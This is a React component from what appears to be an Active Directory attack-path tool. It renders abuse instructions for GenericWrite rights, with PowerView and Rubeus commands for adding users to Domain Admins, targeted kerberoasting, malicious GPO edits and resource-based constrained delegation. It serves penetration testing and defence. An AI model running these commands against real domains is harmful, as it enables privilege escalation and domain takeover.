import React from 'react';
import PropTypes from 'prop-types';

const WindowsAbuse = ({ sourceName, sourceType, targetType }) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <p>
                        GenericWrite to a group allows you to directly modify
                        group membership of the group.
                    </p>
                    <p>
                        There are at least two ways to execute this attack. The
                        first and most obvious is by using the built-in net.exe
                        binary in Windows (e.g.: net group "Domain Admins"
                        harmj0y /add /domain). See the opsec considerations tab
                        for why this may be a bad idea. The second, and highly
                        recommended method, is by using the
                        Add-DomainGroupMember function in PowerView. This
                        function is superior to using the net.exe binary in
                        several ways. For instance, you can supply alternate
                        credentials, instead of needing to run a process as or
                        logon as the user with the AddMember privilege.
                        Additionally, you have much safer execution options than
                        you do with spawning net.exe (see the opsec tab).
                    </p>
                    <p>
                        To abuse this privilege with PowerView's
                        Add-DomainGroupMember, first import PowerView into your
                        agent session or into a PowerShell instance at the
                        console. You may need to authenticate to the Domain
                        Controller as
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Add-DomainGroupMember,
                        first create a PSCredential object (these examples comes
                        from the PowerView help documentation):
                    </p>
                    <pre>
                        <code>
                            {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                                "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                        </code>
                    </pre>
                    <p>
                        Then, use Add-DomainGroupMember, optionally specifying
                        $Cred if you are not already running a process as{' '}
                        {sourceName}:
                    </p>
                    <pre>
                        <code>
                            {
                                "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"
                            }
                        </code>
                    </pre>
                    <p>
                        Finally, verify that the user was successfully added to
                        the group with PowerView's Get-DomainGroupMember:
                    </p>
                    <pre>
                        <code>
                            {"Get-DomainGroupMember -Identity 'Domain Admins'"}
                        </code>
                    </pre>
                </>
            );
        case 'User':
            return (
                <>
                    <p>
                        A targeted kerberoast attack can be performed using
                        PowerView's Set-DomainObject along with
                        Get-DomainSPNTicket.
                    </p>
                    <p>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainObject, first
                        create a PSCredential object (these examples comes from
                        the PowerView help documentation):
                    </p>
                    <pre>
                        <code>
                            {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                                "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                        </code>
                    </pre>
                    <p>
                        Then, use Set-DomainObject, optionally specifying $Cred
                        if you are not already running a process as {sourceName}
                        :
                    </p>
                    <pre>
                        <code>
                            {
                                "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"
                            }
                        </code>
                    </pre>
                    <p>
                        After running this, you can use Get-DomainSPNTicket as
                        follows:
                    </p>
                    <pre>
                        <code>
                            {
                                'Get-DomainSPNTicket -Credential $Cred harmj0y | fl'
                            }
                        </code>
                    </pre>
                    <p>
                        The recovered hash can be cracked offline using the tool
                        of your choice. Cleanup of the ServicePrincipalName can
                        be done with the Set-DomainObject command:
                    </p>
                    <pre>
                        <code>
                            {
                                'Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'
                            }
                        </code>
                    </pre>
                </>
            );
        case 'GPO':
            return (
                <>
                    <p>
                        With GenericWrite on a GPO, you may make modifications
                        to that GPO which will then apply to the users and
                        computers affected by the GPO. Select the target object
                        you wish to push an evil policy down to, then use the
                        gpedit GUI to modify the GPO, using an evil policy that
                        allows item-level targeting, such as a new immediate
                        scheduled task. Then wait for the group
                        policy client to pick up and execute the new evil
                        policy. See the references tab for a more detailed write
                        up on this abuse.
                    </p>
                    <p>
                        This edge can be a false positive in rare scenarios. If you have 
                        GenericWrite on the GPO with 'This object only' (no inheritance) 
                        and no other permissions in the ACL, it is not possible to add or 
                        modify settings of the GPO. The GPO's settings are stored in 
                        SYSVOL under a folder for the given GPO. Therefore, you need write 
                        access to child objects of this folder or create child objects 
                        permission. The security descriptor of the GPO is reflected on 
                        the folder, meaning permissions to write child items on the GPO
                        are required.
                    </p>
                </>
            );
        case 'Computer':
            return (
                <>
                    <p>
                        Generic write to a computer object can be used to
                        perform a resource based constrained delegation attack.
                    </p>
                    <p>
                        Abusing this primitive is currently only possible
                        through the Rubeus project.
                    </p>
                    <p>
                        First, if an attacker does not control an account with
                        an SPN set, Kevin Robertson's Powermad project can be
                        used to add a new attacker-controlled computer account:
                    </p>
                    <pre>
                        <code>
                            {
                                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                            }
                        </code>
                    </pre>
                    <p>
                        PowerView can be used to then retrieve the security
                        identifier (SID) of the newly created computer account:
                    </p>
                    <pre>
                        <code>
                            {
                                '$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'
                            }
                        </code>
                    </pre>
                    <p>
                        We now need to build a generic ACE with the
                        attacker-added computer SID as the principal, and get
                        the binary bytes for the new DACL/ACE:
                    </p>
                    <pre>
                        <code>
                            {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"' +
                                '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                                '$SD.GetBinaryForm($SDBytes, 0)'}
                        </code>
                    </pre>
                    <p>
                        Next, we need to set this newly created security
                        descriptor in the
                        msDS-AllowedToActOnBehalfOfOtherIdentity field of the
                        comptuer account we're taking over, again using
                        PowerView in this case:
                    </p>
                    <pre>
                        <code>
                            {
                                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                            }
                        </code>
                    </pre>
                    <p>
                        We can then use Rubeus to hash the plaintext password
                        into its RC4_HMAC form:
                    </p>
                    <pre>
                        <code>{'Rubeus.exe hash /password:Summer2018!'}</code>
                    </pre>
                    <p>
                        And finally we can use Rubeus' *s4u* module to get a
                        service ticket for the service name (sname) we want to
                        "pretend" to be "admin" for. This ticket is injected
                        (thanks to /ptt), and in this case grants us access to
                        the file system of the TARGETCOMPUTER:
                    </p>
                    <pre>
                        <code>
                            {
                                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                            }
                        </code>
                    </pre>
                </>
            );
    }
};

WindowsAbuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
    targetType: PropTypes.string,
};

export default WindowsAbuse;
